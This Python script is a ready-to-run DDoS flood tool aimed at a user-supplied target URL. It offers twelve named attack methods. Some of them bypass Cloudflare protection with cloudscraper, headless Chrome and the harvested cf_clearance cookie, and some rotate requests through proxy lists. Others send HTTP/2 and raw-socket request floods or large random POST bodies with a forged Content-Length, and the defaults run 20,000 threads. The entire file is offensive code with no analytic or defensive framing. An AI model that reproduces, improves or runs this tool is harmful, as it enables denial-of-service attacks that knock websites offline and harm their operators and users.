import httpx, threading, cloudscraper, requests
import argparse, socket, socks, ssl
import undetected_chromedriver as uc
import random, datetime, time
import hashlib, base64, os
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from fake_useragent import UserAgent
from requests.cookies import RequestsCookieJar
from urllib.parse import urlparse
from os.path import exists

def random_data():
    random_payload = [
        {
            'A': ''.join(base64.b64encode(
                    hashlib.sha256((f'AAAAAAAAAAAAAAAAA{str(random.choice('0987654321abcdefghijklmnopqrstuvwxyz') * 6)}' + str(random.randint(6000, 12000))).encode()).digest()
                ).decode() for _ in range(16384)),
        },
        {
            'B': ''.join(base64.b64encode(
                    hashlib.sha256((f'BBBBBBBBBBBBBBBBB{str(random.choice('0987654321abcdefghijklmnopqrstuvwxyz') * 6)}' + str(random.randint(6000, 12000))).encode()).digest()
                ).decode() for _ in range(16384)),
        },
        {
            'C': ''.join(base64.b64encode(
                    hashlib.sha256((f'CCCCCCCCCCCCCCCCC{str(random.choice('0987654321abcdefghijklmnopqrstuvwxyz') * 6)}' + str(random.randint(6000, 12000))).encode()).digest()
                ).decode() for _ in range(16384)),
        }
    ]

    return random.choice(random_payload)

def random_headers():
    headers_list = [
        {
            'User-Agent': UserAgent().chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'Content-Length': '500000000',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
        },
        {
            'User-Agent': UserAgent().chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'Content-Length': '500000000',
        },
        {
            'User-Agent': UserAgent().chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'Content-Length': '500000000',
            'Upgrade-Insecure-Requests': '200',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        }
    ]

    return random.choice(headers_list)

def get_cookie_windows(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

def get_cookies_linux(url):
    global cookieJAR
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    }
    cookie_jar = RequestsCookieJar()
    response = session.get(url, headers=headers, cookies=cookie_jar)
    cookie_jar.update(session.cookies)
    for cookie in cookie_jar:
        cookieJAR=f"{cookie.name}={cookie.value}"
        cookieJAR = {
            'name': cookie.name,
            'value': cookie.value
        }

    return cookie_jar

class meltodown:
    def __init__(self, url, **kwargs):
        self.url = url
        self.user_agent = kwargs.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
        self.timeout = kwargs.get('timeout', {})
        self.verify = kwargs.get('verify', {})
        self.proxies = kwargs.get('proxies', {})
        self.client = None
        self.scraper = None
    def __enter__(self):
        try:
            self.client = httpx.Client(timeout=self.timeout, verify=self.verify, proxies=self.proxies, headers={'User-Agent': self.user_agent})
        except Exception as e:
            self.client = None

        try:
            self.scraper = cloudscraper.create_scraper()
        except Exception as e:
            self.scraper = None

        if self.client is None and self.scraper is None:
            raise ValueError("Neither HTTPX Client nor Cloudscraper is initialized.")

        return self

    def __exit__(self, exc_type, exc_value, traceback):
        if self.client:
            self.client.close()

    def _send_request(self, method, data=None, **kwargs):
        headers = {'User-Agent': self.user_agent}
        headers.update(kwargs.get('headers', {}))

        try:
            if self.client:
                if method == 'GET':
                    response = self.client.get(self.url, headers=headers)
                elif method == 'POST':
                    headers['Content-Type'] = 'application/json'
                    response = self.client.post(self.url, headers=headers, data=data)
                else:
                    raise ValueError("Invalid HTTP method specified")
            elif self.scraper:
                if method == 'GET':
                    response = self.scraper.get(self.url, headers=headers, timeout=self.timeout, proxies=self.proxies)
                    response = requests.get(self.url, headers=headers, timeout=self.timeout, proxies=self.proxies)
                elif method == 'POST':
                    response = self.scraper.post(self.url, headers=headers, data=data, timeout=self.timeout, proxies=self.proxies)
                    response = requests.post(self.url, headers=headers, data=data, timeout=self.timeout, proxies=self.proxies)
                else:
                    raise ValueError("Invalid HTTP method specified")
            else:
                raise ValueError("Neither HTTPX Client or Cloudscraper is initialized.")

            response.raise_for_status()
            return response.text
        except Exception as e:
            pass

    def get(self, **kwargs):
        return self._send_request('GET', **kwargs)

    def post(self, data, **kwargs):
        return self._send_request('POST', data, **kwargs)

class Method:
    class PXHTTP2:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXHTTP2, args=(until, headers)).start()
        def AttackPXHTTP2(self, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.proxies = random.choice(open(self.proxy, 'r').readlines())
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http://': 'http://'+self.proxies,
                            'https://': 'http://'+self.proxies,
                        }
                    )
                    self.launcher.get(self.url, headers=headers)
                    self.launcher.get(self.url, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class HTTP2:
        def __init__(self, url, thread, time):
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackHTTP2, args=(until, headers)).start()
        def AttackHTTP2(self, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.launcher = httpx.Client(http2=True)
                    self.launcher.get(self.url, headers=headers)
                    self.launcher.get(self.url, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXCFB:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.AttackPXCFB, args=(self.url, until))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()
        def AttackPXCFB(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = {
                    'User-Agent': UserAgent().chrome,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'TE': 'trailers',
                }
                try:
                    self.scraper.get(url, proxies={
                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }, headers=headers)
                    self.scraper.get(url, proxies={
                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXREQ:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXREQ, args=(self.url, headers, until)).start()
        def AttackPXREQ(self, url, headers, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }
                    requests.get(url, proxies=proxy, headers=headers)
                    requests.get(url, proxies=proxy, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXBYP:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackBYP, args=(self.url, until, headers)).start()
        def AttackBYP(self, url, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    proxy = {
                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                    }
                    requests.get(url, proxies=proxy, verify=False)
                    self.scraper.get(url, proxies=proxy, verify=False)
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }, verify=False
                    )
                    self.launcher.get(url, headers=headers)
                except:
                    pass
        def start(self):
            return self.Attack()

    class PXROCKET:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXROCKET, args=(self.url, until))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXROCKET(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    options = webdriver.ChromeOptions()
                    options.add_argument(f"--proxy-server={random.choice(open(self.proxy, 'r').readlines())}")  # Tambahkan proxy
                    options.headless = True
                    driver = uc.Chrome(options=options)
                    driver.get(url)
                except:
                    pass

        def start(self):
            return self.Attack()

    class PXMIX:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, browser='chrome', delay=6, captcha={'provider': 'return_response'})

        # Memulai thread untuk melakukan attack
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXMIX, args=(self.url, until, headers))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXMIX(self, url, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    requests.get(url, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }, headers=headers)
                    self.scraper.get(url, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }, headers=headers)
                    self.launcher = httpx.Client(
                        http2=True,
                        proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }
                    )
                    self.launcher.get(self.url, headers=headers)
                except:
                    pass

        def start(self):
            return self.Attack()

    class PXCFPRO:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.session = requests.Session()
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, sess=self.session, browser='chrome')
            try:
                get_cookie_windows(str(args.url)) if os.name == 'nt' else get_cookies_linux(str(args.url))
                if cookieJAR:
                    jar = RequestsCookieJar()
                    jar.set(cookieJAR['name'], cookieJAR['value'])
                    self.scraper.cookies = jar
                else:
                    pass
            except:
                pass

        # Memulai thread untuk melakukan attack
        def Attack(self):
            headers = {
                'User-Agent': UserAgent().chrome,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
            }
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXCFPRO, args=(self.url, until, headers))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXCFPRO(self, url, until_datetime, headers):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    self.scraper.get(url, headers=headers, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        })
                    self.scraper.get(url, headers=headers, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        })
                except:
                    pass

        def start(self):
            return self.Attack()

    class PXKILL:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper()

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXKILL, args=(self.url, until))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXKILL(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = random_headers()
                payload = random_data()
                try:
                    self.scraper.post(url, headers=headers, data=payload, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        })
                    requests.post(url, headers=headers, data=payload, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        })
                except:
                    pass

        def start(self):
            return self.Attack()

    class PXSOC:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXSOC, args=(self.url, until))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXSOC(self, url, until_datetime, proxy_type=socks.HTTP):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    parsed_proxy = random.choice(open(self.proxy, 'r').readlines()).split(':')
                    proxy_host = str(parsed_proxy[0])
                    proxy_port = int(parsed_proxy[1])
                    parsed = urlparse(url)
                    self.host = parsed.hostname
                    self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                    self.path = parsed.path if parsed.path else '/'
                    if parsed.query:
                        self.path += '?' + parsed.query
                    # Buat socket menggunakan PySocks
                    sock = socks.socksocket()
                    sock.set_proxy(proxy_type, proxy_host, proxy_port)
                    # Hubungkan ke server melalui proxy
                    sock.connect((self.host, self.port))
                    # Jika HTTPS, wrap socket dengan SSL
                    if parsed.scheme == 'https':
                        context = ssl.create_default_context()
                        self.sock = context.wrap_socket(sock, server_hostname=self.host)

                    # Buat dan kirim HTTP request
                    request = (
                        f"GET {self.path} HTTP/1.1\r\n"
                        f"Host: {self.host}\r\n"
                        f"User-Agent: {UserAgent().chrome}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
                        f"Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\n\r\n"
                        f"Accept-Encoding: deflate, gzip;q=1.0, *;q=0.5\r\n\r\n"
                        f"Cache-Control: no-cache\r\n\r\n"
                        f"Pragma: no-cache\r\n\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                        f"Upgrade-Insecure-Requests: 1\r\n\r\n"
                        f"Sec-Fetch-Dest: document\r\n\r\n"
                        f"Sec-Fetch-Mode: navigate\r\n\r\n"
                        f"Sec-Fetch-Site: same-origin\r\n\r\n"
                        f"Sec-Fetch-User: ?1\r\n\r\n"
                        f"TE: trailers\r\n\r\n"
                    )
                    try:
                        sock.sendall(request.encode())
                        sock.sendall(request.encode())
                    except:
                        sock.close()
                except:
                    return

        def start(self):
            return self.Attack()

    class PXHOSHINO:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper()

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXHOSHINO, args=(self.url, until))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXHOSHINO(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = {
                    'User-Agent': UserAgent().chrome,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'TE': 'trailers',
                }
                try:
                    self.scraper.get(url, headers=headers, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }, allow_redirects=False)
                    requests.get(url, headers=headers, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }, allow_redirects=False)
                except:
                    pass

        def start(self):
            return self.Attack()

    class PXMELTED:
        def __init__(self, url, thread, time, proxy):
            self.proxy = proxy
            self.url = url
            self.thread = thread
            self.time = time

        # Memulai thread untuk melakukan attack
        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            threads = []
            for _ in range(self.thread):
                thread = threading.Thread(target=self.PXMELTED, args=(self.url, until))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        def PXMELTED(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = {
                    'User-Agent': UserAgent().chrome,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'TE': 'trailers',
                }
                try:
                    with meltodown(url, proxies={
                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                        }, headers=headers, timeout=30) as scrape:
                        scrape.get()
                        for _ in range(200):
                            scrape.get()
                except:
                    pass

        def start(self):
            return self.Attack()

class Runner:
    def __init__(self, args):
        self.args = args
    def start():
        with ThreadPoolExecutor(max_workers=int(args.tpe)) as executor:
            exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}, "{args.proxy}").start())') if 'PX' in str(args.method).upper() else exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}).start())')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=f'Usage: python3 {__file__} [OPTIONS]')
    parser.add_argument('-u', '--url', type=str, help='Target URL', required=True, metavar='https://example.com')
    parser.add_argument('-th', '--thread', type=str, help='Threader', metavar='20000', default=20000)
    parser.add_argument('-t', '--time',type=str, help='DDoS Duration', metavar='45', default=45)
    parser.add_argument('-p', '--proxy', type=str, help='Proxy address', metavar='proxy.txt')
    parser.add_argument('-tpe', '--tpe', type=str, help='ThreadPoolExecutor', metavar='150-300', default=150)
    parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, HTTP2, PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO, PXKILL, PXSOC, PXHOSHINO, PXMELTED', required=True)
    args = parser.parse_args()
    if 'PX' in args.method:
        if args.proxy and exists(args.proxy):
            pass
        else:
            print(f"[Error] No file or directory: '{args.proxy}'")
            exit(1)
    threading.Thread(target=Runner.start()).start()
